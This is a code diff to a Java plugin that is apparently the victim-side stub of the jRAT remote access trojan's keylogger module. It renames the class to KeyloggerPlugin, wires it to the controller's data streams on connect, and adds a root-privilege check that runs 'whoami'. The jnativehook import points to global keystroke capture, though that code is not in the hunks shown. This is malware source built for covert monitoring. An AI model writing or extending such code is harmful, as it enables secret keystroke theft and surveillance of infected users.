@@ -1,14 +1,17 @@
 package pro.jrat.plugin.stub;
 
+import java.io.BufferedReader;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
 
 import org.jnativehook.GlobalScreen;
 
 import pro.jrat.api.stub.StubPlugin;
 
 
-public class Plugin extends StubPlugin {
+public class KeyloggerPlugin extends StubPlugin {
 	
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
@@ -49,8 +52,8 @@ public class Plugin extends StubPlugin {
 	}
 	
 	public void onConnect(DataInputStream in, DataOutputStream out) {
-		Plugin.dis = in;
-		Plugin.dos = out;
+		KeyloggerPlugin.dis = in;
+		KeyloggerPlugin.dos = out;
 	}
 	
 	public void onPacket(byte header) throws Exception {
@@ -80,5 +83,9 @@ public class Plugin extends StubPlugin {
 	@Override
 	public String getName() {
 		return "Keylogger";
+	}
+	
+	public static boolean isRoot() throws Exception {
+		return !System.getProperty("os.name").toLowerCase().contains("win") && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
 	}
 }
